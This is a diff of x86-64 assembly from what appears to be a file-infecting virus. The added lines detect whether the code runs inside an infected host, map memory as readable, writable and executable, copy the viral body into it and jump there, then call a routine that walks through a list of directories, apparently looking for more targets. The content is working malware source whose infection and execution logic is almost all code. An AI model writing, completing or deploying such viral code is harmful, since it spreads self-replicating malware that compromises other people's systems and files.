@@ -67,8 +67,6 @@ _inject:
 	cmp rax, 0x0
 	jne _end
 
-	; save register
-
 	%ifdef DEBUG
 		mov rdi, r8
 		add rdi, 0x5
@@ -76,6 +74,69 @@ _inject:
 	%endif
 	; r8 contains the entry of the virus
 
+	; copy the prg in memory and launch it
+	xor rax, rax; = 0
+	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
+	jne .infected
+
+	call _host
+	jmp _end
+
+	.infected:
+		push rdx
+
+		push r8
+		; mmap
+		xor rdi, rdi; NULL
+
+		lea rsi, [rel _eof]
+		lea rax, [rel _start]
+		sub rsi, rax ; length
+		push 7
+		pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
+		push 34
+		pop r10; MAP_PRIVATE | MAP_ANON
+		push -1
+		pop r8 ; fd
+		xor r9, r9; offset
+		push 9
+		pop rax; mmap
+		syscall
+
+		pop r8
+
+		push rax
+		pop rdi
+		push rsi
+		pop rdx
+		mov rsi, r8
+		call _ft_memcpy
+		push rdx
+		pop rsi
+
+		pop rdx
+
+		push rsi
+		push rdi
+
+		lea rsi, [rel _start]
+		lea rax, [rel _host]
+		sub rax, rsi
+		add rax, rdi
+
+		call rax ; jump to mmaped memory
+
+		pop rdi
+		pop rsi
+
+		; munmap
+		push 11
+		pop rax
+		syscall
+
+		jmp _end
+
+_host:
 	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
@@ -88,6 +149,7 @@ _inject:
 	inc rcx
 	cmp byte[rdi + rcx], 0x0
 	jnz .loop_array_string
+ret
 
 _end:
 	xor rax, rax; = 0
